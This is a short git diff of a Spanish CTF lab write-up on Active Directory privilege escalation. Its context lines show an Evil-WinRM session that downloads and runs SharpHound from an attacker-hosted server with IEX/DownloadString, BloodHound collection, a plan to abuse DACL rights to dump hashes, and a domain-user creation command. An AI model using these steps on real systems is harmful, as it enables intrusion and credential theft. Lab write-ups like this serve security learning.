@@ -142,7 +142,7 @@ que pertenecía nuestro usuario (por eso se pudo acceder al winrm).
 ```
 Se ponen las credenciales en la pagina que te abre en el localhost, se abre el bllohound por otro lado tambien.
 Y se comparte este [script](https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) 
-En kali nos ponemos en escucha por python 
+En kali nos ponemos en escucha por python.
 ```console
 *Evil-WinRM*> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15:8000/SharpHound.ps1')
 *Evil-WinRM*> Invoke-BloodHound -CollectionMethod All
@@ -154,6 +154,7 @@ En kali nos ponemos en escucha por python
 Subimos esto a la herramienta y le marcamos a svc-alfresco como pwneado. En **Reachable hight value targets**
 nos dice que pertenece a Exchange Windows Permissions (o sea que tenemos el privilegio de cambiar los permisos
 a nuestro gusto, puediendo cambiar el Dacl y asi dumpear los hashes con el secresdump)
+Para cierta funcion *Add-DomainObjectAcl* necesitamos este otro [script](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
 
 ```console
 PS> net user cucuxii cucuxii123 /add /domain
